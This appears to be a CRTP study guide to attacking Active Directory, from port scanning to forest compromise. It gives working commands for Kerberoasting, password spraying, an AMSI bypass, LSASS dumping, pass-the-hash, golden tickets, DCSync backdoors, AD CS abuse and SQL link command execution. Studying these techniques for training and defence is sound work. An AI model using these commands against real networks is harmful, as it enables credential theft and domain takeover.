This guide walks the exact path CRTP teaches: start with nothing (black box), get a foothold (gray box), enumerate the domain, move laterally, escalate to Domain Admin, then push into trusts, certificates, and SQL servers. Every technique includes a plain‑English definition, a worked example, the real command, and the GitHub source of the tool — so you understand the "why" before memorizing the "how".

PHASE 1

Black Box Testing

You have a network jack and nothing else — no usernames, no creds, no domain‑joined laptop. The goal is to find a Domain Controller and squeeze out a first username or password.

1.1Port Scanning

Definition: Probing a host's TCP/UDP ports to learn which services are running. In AD, you are specifically hunting for ports that only a Domain Controller exposes.

Why it matters: Finding port 88 (Kerberos), 389 (LDAP), and 445 (SMB) open together on one host almost always means "this is a Domain Controller" — your first real target.

PortServiceWhy it's interesting
53DNSDCs are usually also DNS servers for the domain
88KerberosNeeded for AS‑REP roasting / ticket requests
389 / 636LDAP / LDAPSLets you query the directory (users, groups, ACLs)
445SMBFile shares, null sessions, relay targets
3268 / 3269Global CatalogForest‑wide LDAP search
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269 -sV 10.10.10.0/24
# or quick service sweep with a fast scanner
naabu -host 10.10.10.0/24 -p 88,389,445

Example: Scanning 10.10.10.0/24 returns one host with 88, 389 and 445 all open — that host is almost certainly the Domain Controller for the range, and its hostname/domain name often appears in the LDAP banner.

nmap naabu
1.2.1Username Enumeration → AS‑REP Roasting

Definition: AS‑REP Roasting targets accounts with "Do not require Kerberos preauthentication" enabled. Kerberos normally asks you to prove you know the password before issuing a ticket (preauth). If that check is disabled, anyone can request a ticket for that user — no password needed — and the ticket comes back encrypted with a hash of the user's password, which you can then crack offline.

Step 1 — find valid usernames (Kerberos lets you check whether a username exists, without a password):

kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt

Step 2 — request AS‑REP for users with preauth disabled, then crack offline:

impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

Example: The user svc-backup was set up years ago with preauth disabled for a legacy app. GetNPUsers grabs its AS‑REP hash with zero credentials; hashcat then cracks the weak password "Summer2023!" offline in seconds.

kerbrute impacket hashcat
1.2.2Credentials Brute Force

Definition: Trying many passwords against one account (brute force) or one common password against many accounts (password spraying) to avoid account lockouts.

⚠ Always check the domain's lockout policy first (net accounts or the Kerberos policy via LDAP) — a few wrong guesses per account, spread across all accounts, stays under the radar; many guesses on one account locks it out and alerts the blue team.
kerbrute passwordspray -d corp.local --dc 10.10.10.10 users.txt 'Summer2024!'
# NetExec for SMB/LDAP based spraying
netexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

Example: Spraying the single password "Welcome1" against 400 enumerated usernames over Kerberos (which doesn't trigger the same lockout counters as SMB in some configs) reveals three accounts still using the default onboarding password.

kerbrute NetExec (CME successor)
PHASE 2

Gray Box Testing — Initial Access

You now have one set of valid credentials (handed to you, or won in Phase 1) and a session on a domain‑joined machine — exactly the CRTP lab starting position.

2.1.1Bypass Antimalware Scan Interface (AMSI)

Definition: AMSI is a Windows interface that lets antivirus engines inspect script content (PowerShell, VBScript) before it runs, even in‑memory. An "AMSI bypass" patches or confuses this interface in your own PowerShell process so that offensive tools (PowerView, Mimikatz, Rubeus) load without being flagged.

Why it matters: Almost every classic AD attack tool is written in PowerShell or C# loaded reflectively into a PowerShell process. Without bypassing AMSI first, Defender kills the script the moment it's typed.

# classic reflection-based patch (concept, signatures change often)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)
📝 Public one‑liners get signatured fast. In real engagements (and in the CRTP lab), expect to tweak variable names/obfuscate, or use an updated bypass from a maintained repo.
Amsi-Bypass-Powershell PowerShdll
PHASE 3

Domain Enumeration

With one valid login, you can query the directory itself — Active Directory is, at its core, a giant searchable database (LDAP), and almost every authenticated user can read most of it by default.

3.2Users · Computers · Groups · OUs

Definition: Domain enumeration is systematically pulling objects out of LDAP: user accounts, computer accounts, security groups (Domain Admins, Enterprise Admins, Administrators), Organizational Units (OUs — folders that organize objects and receive GPOs), and the Kerberos policy (lockout/ticket lifetime settings).

# PowerView (load reflectively after an AMSI bypass)
Get-DomainUser | select samaccountname,description
Get-DomainComputer | select dnshostname,operatingsystem
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainOU | select name,distinguishedname
Get-DomainGPO | select displayname

# ActiveDirectory RSAT module equivalents
Get-ADUser -Filter * -Properties description
Get-ADGroupMember "Domain Admins"
Get-ADOrganizationalUnit -Filter *

# Living-off-the-land, no tools needed
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

Example: Get-DomainUser | select description often surfaces helpdesk notes like "temp pw: Welcome2024" left in the description field — a real, common finding.

PowerView (PowerSploit) PowerView (dev branch) ActiveDirectory module (RSAT)
3.2.13–14Access Control Lists & GPOs

Definition: Every AD object has a security descriptor — a DACL listing exactly who can do what to it (reset password, write attributes, add members, etc). "Interesting" ACLs are permissions a low‑privileged user holds over a higher‑value object, usually granted by accident.

Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Get-ObjectAcl -SamAccountName "svc-web" -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'}

# GPO applied on a specific OU
Get-DomainGPO -ComputerIdentity WS01
Get-DomainOU -GPLink "*{GUID}*"

Example: A helpdesk group was once given GenericAll on the IT_Admins OU to "reset passwords" — but that right also lets them reset passwords for every admin account inside that OU, an unintended escalation path.

PowerView gpoParser
3.3Forest, Domain & Trust Enumeration

Definition: A forest is a collection of one or more domains sharing a schema and a top‑level "Enterprise Admin" group. A trust is a relationship that lets users in one domain authenticate to resources in another. Trusts can be one‑way or bidirectional, and within‑forest or across‑forest.

Get-Domain
Get-ForestDomain
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping  # walk every trust recursively

Example: corp.local trusts prod.corp.local bidirectionally — meaning a compromise in either domain is a realistic stepping stone into the other.

PowerView

PHASE 4

Lateral Movement & Credential Theft

Turn one foothold into many. This is where enumeration findings become actual access.

3.9Kerberoasting

Definition: Any authenticated user can request a Kerberos service ticket (TGS) for any account that has a Service Principal Name (SPN) — typically service accounts. That ticket is encrypted with a hash derived from the service account's password. You take the ticket offline and crack it; no alerts, no lockouts, because requesting a ticket is completely normal Kerberos behavior.

Get-DomainUser -SPN | select samaccountname,serviceprincipalname
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.10.10.10 -request
hashcat -m 13100 spn_hashes.txt rockyou.txt

Example: The SQL service runs as svc-sql with SPN MSSQLSvc/db01:1433. Its ticket cracks to reveal a password that was never rotated since the server was built — instant lateral access to anything that account can touch.

impacket Rubeus hashcat
3.23ACL Abuse — GenericAll / GenericWrite / WriteDacl / AddSelf / AddMember / WriteOwner / ForceChangePassword

Definition: Each ACE (access control entry) you found while enumerating is a separate attack primitive. The right determines exactly what you can do:

RightWhat it lets you do
GenericAllFull control — reset password, add to group, anything
GenericWriteEdit most attributes — e.g. set a logon script that runs as the target
WriteDaclRewrite the object's own permissions — grant yourself GenericAll
WriteOwnerBecome the object's owner, then grant yourself rights
ForceChangePasswordReset the target's password without knowing the old one
AddSelf / AddMemberAdd yourself (or another account) into a group
# GenericAll over a user -> reset their password
Set-DomainUserPassword -Identity jdoe -AccountPassword (ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force)

# GenericAll/AddMember over a group -> add yourself
Add-DomainGroupMember -Identity "Domain Admins" -Members "currentuser"

# WriteDacl -> grant yourself GenericAll, then use it
Add-DomainObjectAcl -TargetIdentity "svc-sql" -PrincipalIdentity "currentuser" -Rights All

Example: BloodHound shows your compromised account has GenericAll on the svc-backup account — and svc-backup happens to be a member of Domain Admins. Resetting its password is a one‑command path to Domain Admin.

PowerView BloodHound
3.15–16LAPS Password Read & GPO Abuse

Definition: LAPS (Local Administrator Password Solution) auto‑rotates each computer's local Administrator password and stores it as an attribute in AD, readable only by delegated groups. If your account is (often unintentionally) in that delegated group, you can read any managed machine's local admin password. GPO abuse means editing a Group Policy Object you have write access to, so it pushes a malicious scheduled task / startup script to every computer it applies to.

# Read LAPS password (legacy attribute name shown; newer LAPS uses msLAPS-Password)
Get-DomainObject -Identity WS01 -Properties ms-mcs-AdmPwd

# Evil-WinRM has a built-in LAPS reader once you have rights
evil-winrm -i ws01.corp.local -u Administrator -p '<laps-password>'

# Abuse write access to a GPO -> add a scheduled task (SharpGPOAbuse)
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author corp\jdoe --Command "cmd.exe" --Arguments "/c net localgroup administrators jdoe /add" --GPOName "Default Domain Policy"
Evil-WinRM SharpGPOAbuse
3.17Dump Credentials

Definition: Once you're local admin on a box, you can pull credential material out of memory (LSASS process) or local databases (SAM): plaintext passwords (if WDigest is on), NTLM hashes, and Kerberos tickets.

mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam

# OPSEC-safer / EDR-resistant alternative: dump LSASS to disk and parse offline
procdump64.exe -ma lsass.exe lsass.dmp
pypykatz lsa minidump lsass.dmp
⚠ LSASS dumping is one of the most heavily signatured actions in modern EDR. Mimikatz itself is almost always flagged — expect to use loaders, obfuscation, or alternative extraction methods on real engagements.
Mimikatz pypykatz
3.18–19Pass‑the‑Hash (PtH) & OverPass‑the‑Hash (OPtH)

Pass‑the‑Hash: Authenticate over NTLM using a stolen NTLM hash directly — you never need the plaintext password.

OverPass‑the‑Hash: Use an NTLM hash to request a real Kerberos TGT for that user, converting an NTLM credential into a full Kerberos identity (useful once a network is Kerberos‑only).

# Pass-the-Hash
mimikatz # sekurlsa::pth /user:jdoe /domain:corp.local /ntlm:<hash> /run:cmd.exe

# OverPass-the-Hash with Rubeus
Rubeus.exe asktgt /user:jdoe /domain:corp.local /rc4:<hash> /ptt
Mimikatz Rubeus
PHASE 5

Domain Privilege Escalation

The core of the CRTP exam: abuse Kerberos delegation, forge tickets, and pull the keys to the kingdom (krbtgt) from the DC.

3.21–3.24, 3.25Delegation Attacks (Unconstrained, Constrained, RBCD, S4U2Self)

Kerberos delegation lets a service impersonate a user to reach a second service on their behalf — e.g. a web server impersonating you to query a backend database. Misconfigured delegation is one of the highest‑value AD privesc paths.

TypeHow it worksAbuse
Unconstrained DelegationServer can impersonate any user to any serviceWait for/force a Domain Admin to connect → steal their TGT from memory → DCSync
Constrained Delegation (w/ protocol transition)Server can impersonate any user, but only to specific listed servicesS4U2Self + S4U2Proxy to mint a ticket as any user, to an allowed service
Constrained Delegation (no protocol transition)Same, but requires the user's real TGT firstNeed a Kerberos‑authenticated session, then S4U2Proxy
Resource‑Based Constrained Delegation (RBCD)The target resource decides who can delegate to it (msDS‑AllowedToActOnBehalfOfOtherIdentity)If you can write that attribute on a computer object, you can delegate to it as anyone — including a DA
# find unconstrained delegation hosts
Get-DomainComputer -Unconstrained

# RBCD: you have GenericWrite on a computer object -> add a fake computer as "allowed"
New-MachineAccount -MachineAccount evilpc -Password (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)
Set-DomainComputer -Identity TargetPC -Rawattribute msDS-AllowedToActOnBehalfOfOtherIdentity -value <raw SD bytes for evilpc>

Rubeus.exe s4u /user:evilpc$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/targetpc.corp.local /ptt

Example: A print server has unconstrained delegation enabled (a classic legacy misconfig). Forcing the DC to authenticate to it (via the printer bug or a coerced SMB connection) captures the DC's own TGT in memory — game over for the domain.

Rubeus Powermad PetitPotam (coercion)
3.26–28Golden / Silver / Diamond Tickets

Golden Ticket: Forge a TGT from scratch using the domain's krbtgt account hash. Since the krbtgt account signs every Kerberos ticket in the domain, owning its hash means you can mint a "ticket" for any user (even one that doesn't exist) with any group memberships, valid until you change the krbtgt password (twice).

Silver Ticket: Same idea but forged using a specific service account's hash instead of krbtgt — grants access only to that one service, but doesn't need DC contact and is stealthier.

Diamond Ticket: Take a real TGT issued by the DC and modify its fields (e.g. group memberships) in‑place, re‑encrypting with the krbtgt key — harder to detect than a Golden Ticket because the ticket's other metadata looks legitimate.

# Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:<domain SID> /krbtgt:<krbtgt hash> /ptt

# Silver Ticket (for a CIFS service on a target server)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:<domain SID> /target:fileserver.corp.local /service:cifs /rc4:<service acct hash> /ptt
Mimikatz Rubeus
3.21.1, 3.29–30DCSync · Domain DPAPI Backup Key · Granting DCSync

DCSync: Domain Controllers normally replicate password hashes to each other using a replication protocol (MS‑DRSR). DCSync abuses this by impersonating a Domain Controller and asking a real DC to "replicate" any account's hash to you — including krbtgt — without ever touching LSASS on the DC itself.

Requires: the rights DS-Replication-Get-Changes and DS-Replication-Get-Changes-All on the domain object (normally only Domain Admins / Enterprise Admins / DCs have these — but they can be granted to a lower account by mistake, or deliberately as a persistence backdoor).

mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
impacket-secretsdump corp.local/jdoe:pass@10.10.10.10 -just-dc-ntlm

# Backdoor: grant DCSync rights to a low-priv user (persistence)
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity jdoe -Rights DCSync

DPAPI Domain Backup Key: DPAPI encrypts secrets (saved browser passwords, RDP creds) using a key tied to the user — but the domain holds a master backup key so any of those secrets can be decrypted by anyone with that key, regardless of whose account encrypted them.

mimikatz # lsadump::backupkeys /system:dc01.corp.local /export
impacket (secretsdump) Mimikatz
3.20Read gMSA Password

Definition: A Group Managed Service Account (gMSA) is a service account whose password is auto‑rotated and managed by AD itself. Any principal listed in its PrincipalsAllowedToRetrieveManagedPassword attribute can read that password directly from LDAP — no cracking required.

Get-ADServiceAccount -Identity svc-gmsa -Properties PrincipalsAllowedToRetrieveManagedPassword
# Pull and convert to NTLM with GMSAPasswordReader / DSInternals
Get-ADServiceAccount svc-gmsa -Properties msDS-ManagedPassword | ConvertFrom-ADManagedPasswordBlob

PHASE 6 · advanced (CRTE territory)

Beyond the Domain

These topics extend past the core CRTP syllabus into CRTE‑style content: certificate services, cross‑trust pivoting, and database links.

3.31Active Directory Certificate Services — ESC1 to ESC15

Definition: AD CS issues digital certificates that can be used to authenticate as a user (sometimes even more powerfully than a password — a cert doesn't expire on its own and bypasses some MFA). Misconfigured certificate templates ("ESC" = Escalation) let low‑privileged users request certificates that let them impersonate anyone, including Domain Admins.

IDRoot cause (short)
ESC1Template lets requester supply any Subject Alternative Name (SAN) → request a cert "as" any user
ESC2Template allows "Any Purpose" or no EKU restriction
ESC3Template grants the "Certificate Request Agent" enrollment agent role abusively
ESC4Low‑priv user has write access to the template object itself → reconfigure it to be ESC1‑like
ESC5Write access to the CA object / its container in AD
ESC6CA‑wide flag EDITF_ATTRIBUTESUBJECTALTNAME2 lets any template accept attacker‑supplied SAN
ESC7Low‑priv user holds CA management rights (Manage CA / Manage Certificates)
ESC8CA web enrollment (HTTP) is vulnerable to NTLM relay
ESC9/10Certificate mapping / weak‑mapping downgrade issues (no security extension, UPN mismatch)
ESC11RPC encryption not enforced on the CA → relay over RPC
ESC12/13/14/15Newer issues: YubiHSM key storage permissions, OID group‑linked templates, weak/empty SAN, and version‑4 template downgrade (2024+ research)
certipy find -u user@corp.local -p pass -dc-ip 10.10.10.10 -vulnerable
# ESC1 example: request a cert as Administrator via a vulnerable template
certipy req -u user@corp.local -p pass -ca CORP-CA -target dc01.corp.local -template VulnTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

3.32–33Domain & Forest Trust Attacks

Definition: A trust relationship has its own secret — the trust key — shared between the two domains' DCs, conceptually similar to krbtgt but for cross‑domain tickets (an "Inter‑Realm TGT"). If you compromise one side of a trust (or capture the trust key/krbtgt hash), you can forge tickets accepted on the other side.

# dump the trust key from a compromised DC
mimikatz # lsadump::trust /patch

# forge an inter-realm TGT and request access on the trusting domain
mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:<child SID> /sids:<Enterprise Admins SID> /rc4:<trust key> /service:krbtgt /target:corp.local /ticket:interrealm.kirbi

Example: Compromising a child domain (child.corp.local) and abusing SID History / the trust key with the Enterprise Admins SID grants access back up to the forest root — the classic "child domain compromises the whole forest" path.

Mimikatz
3.34MSSQL — Logins, Impersonation, Trusted Links

Definition: SQL Server has its own permission layer on top of Windows auth. "Impersonation" rights let one SQL login act as a higher‑privileged login on the same server; "Linked servers" connect one SQL Server to another, and if that link runs as a privileged account, you can run queries (and OS commands via xp_cmdshell) on the linked server too — sometimes chaining across several servers.

impacket-mssqlclient corp.local/user:pass@10.10.10.20 -windows-auth
SQL> SELECT name FROM sys.server_principals;
SQL> EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');
SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

Example: A low‑priv SQL login can impersonate sa on Server A, which has a trusted link to Server B (a Domain Controller running SQL for an inventory app) — letting commands run as SYSTEM on the DC itself.

impacket (mssqlclient) PowerUpSQL

Glossary — terms you'll see constantly

Domain Controller (DC)

The server holding the AD database and issuing Kerberos tickets. Compromising one DC's krbtgt = compromising the whole domain.

SPN (Service Principal Name)

A label like MSSQLSvc/db01:1433 identifying which service an account runs — the basis of Kerberoasting.

TGT / TGS

Ticket Granting Ticket (proves who you are to the DC) vs Ticket Granting Service ticket (proves who you are to one specific service).

krbtgt

The special domain account whose password hash signs every Kerberos ticket in the domain. The ultimate target for a Golden Ticket.

SID / SID History

Security Identifier — a unique ID per account/group. SID History lets an account "remember" old SIDs (e.g. after a domain migration) — and can be abused to inherit privileges it shouldn't have.

NTLM hash

A hash of a password, usable directly for authentication (Pass‑the‑Hash) without ever knowing the plaintext.

DACL / ACE

Discretionary Access Control List — the set of Access Control Entries on an object that define who can do what to it.

OU (Organizational Unit)

A folder-like container in AD used to organize objects and apply Group Policy to a specific subset of users/computers.

GPO

Group Policy Object — a bundle of settings/scripts pushed automatically to every computer/user it's linked to.

LAPS

Local Administrator Password Solution — rotates and stores each machine's local admin password in AD.

gMSA

Group Managed Service Account — a service account with an AD‑rotated password, readable by authorized principals straight from LDAP.

EKU

Extended Key Usage — a field in a certificate defining what it can be used for (e.g. client authentication) — central to AD CS (ESC) attacks.
